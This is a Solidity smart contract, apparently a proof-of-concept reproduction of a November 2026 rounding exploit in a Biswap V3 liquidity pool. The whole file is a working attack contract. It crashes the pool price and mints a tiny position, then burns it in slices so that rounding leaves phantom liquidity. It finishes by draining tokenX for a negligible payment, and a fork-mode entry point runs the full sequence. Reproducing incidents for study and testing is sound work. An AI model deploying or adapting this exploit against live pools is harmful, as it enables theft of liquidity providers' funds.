// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "./biswap/interfaces/IBiswapPoolV3.sol";
import "./biswap/interfaces/IBiswapCallback.sol";
import "./biswap/interfaces/IERC20Minimal.sol";

interface IWBNB {
    function deposit() external payable;
}

/// @title Biswap V3 burn-rounding reproduction
/// @notice Executes the same state transitions as the 24 Nov 2026 BiswapPoolV3
///         incident: mint a tiny active position at the bottom of the price
///         range, burn it in ten slices while the current-point amounts round
///         to zero, then buy tokenX with a negligible amount of tokenY.
/// @dev This contract is for a local/test environment only. It is not a
///      mainnet attack tool.
contract AttackBiswapBurn is IBiswapMintCallback, IBiswapCallback {
    IBiswapPoolV3 public immutable pool;
    IERC20Minimal public immutable tokenX;
    IERC20Minimal public immutable tokenY;

    int24 public immutable leftPt;
    int24 public immutable rightPt;
    uint128 public immutable mintLiquidity;
    uint128 public immutable burnLiquidity;
    uint256 public immutable burnCount;
    uint128 public immutable desireX;
    int24 public immutable highPt;

    uint256 public mintPaidY;
    uint256 public swapPaidY;
    uint256 public swapReceivedX;
    uint256 public collectedY;

    uint256 public crashPaidX;
    uint256 public crashReceivedY;

    bool public executed;

    event AttackExecuted(
        uint256 mintPaidY,
        uint256 swapPaidY,
        uint256 swapReceivedX,
        uint256 collectedY
    );

    constructor(
        address pool_,
        address tokenX_,
        address tokenY_,
        int24 leftPt_,
        int24 rightPt_,
        uint128 mintLiquidity_,
        uint128 burnLiquidity_,
        uint256 burnCount_,
        uint128 desireX_,
        int24 highPt_
    ) {
        pool = IBiswapPoolV3(pool_);
        tokenX = IERC20Minimal(tokenX_);
        tokenY = IERC20Minimal(tokenY_);

        leftPt = leftPt_;
        rightPt = rightPt_;
        mintLiquidity = mintLiquidity_;
        burnLiquidity = burnLiquidity_;
        burnCount = burnCount_;
        desireX = desireX_;
        highPt = highPt_;
    }

    /// @notice Run the reproduction from the post-crash state. The caller must
    ///         fund this contract with tokenY before calling (500 wei for the
    ///         mint, 480 wei returned by collect, and the swap input).
    function attack() external {
        _attack();
    }

    /// @notice Fork-mode entry point: wrap BNB into tokenX, execute the
    ///         price-crashing swap, then run the burn/collect/drain sequence.
    ///         Used by the optional mainnet-fork test.
    function fullAttack(uint128 crashAmountX, int24 lowPt) external payable {
        IWBNB(address(tokenX)).deposit{value: msg.value}();
        crash(crashAmountX, lowPt);
        _attack();
    }

    /// @notice Wrap BNB into tokenX (fork mode helper).
    function wrap() external payable {
        IWBNB(address(tokenX)).deposit{value: msg.value}();
    }

    /// @notice Step 0 (fork mode): push the pool to the bottom of its range so
    ///         that the target position becomes active at an extreme point.
    function crash(uint128 amountX, int24 lowPt) public {
        pool.swapX2Y(address(this), amountX, lowPt, "");
    }

    function _attack() internal {
        require(!executed, "already executed");
        executed = true;

        mintPosition();
        for (uint256 i = 0; i < burnCount; i++) {
            burnOnce();
        }
        collectOwed();
        drain();

        emit AttackExecuted(mintPaidY, swapPaidY, swapReceivedX, collectedY);
    }

    /// @notice Step 1: add a tiny active position at the bottom of the range.
    function mintPosition() public {
        pool.mint(address(this), leftPt, rightPt, mintLiquidity, "");
    }

    /// @notice Step 2: remove one slice. The current-point amounts round to 0,
    ///         so the vulnerable module leaves state.liquidity untouched.
    function burnOnce() public {
        pool.burn(leftPt, rightPt, burnLiquidity);
    }

    /// @notice Step 3: collect the 48 wei per burn that was credited to the
    ///         position (the part below the current point).
    function collectOwed() public {
        uint256 yBeforeCollect = tokenY.balanceOf(address(this));
        pool.collect(address(this), leftPt, rightPt, 0, type(uint256).max);
        collectedY += tokenY.balanceOf(address(this)) - yBeforeCollect;
    }

    /// @notice Step 4: spend a negligible amount of tokenY to buy tokenX
    ///         against the phantom active liquidity.
    function drain() public {
        pool.swapY2XDesireX(address(this), desireX, highPt, "");
    }

    function mintDepositCallback(uint256 x, uint256 y, bytes calldata) external override {
        require(msg.sender == address(pool), "only pool");
        if (x > 0) tokenX.transfer(msg.sender, x);
        if (y > 0) tokenY.transfer(msg.sender, y);
        mintPaidY += y;
    }

    function swapY2XCallback(uint256 x, uint256 y, bytes calldata) external override {
        require(msg.sender == address(pool), "only pool");
        tokenY.transfer(msg.sender, y);
        swapPaidY += y;
        swapReceivedX += x;
    }

    function swapX2YCallback(uint256 x, uint256 y, bytes calldata) external override {
        require(msg.sender == address(pool), "only pool");
        tokenX.transfer(msg.sender, x);
        crashPaidX += x;
        crashReceivedY += y;
    }
}
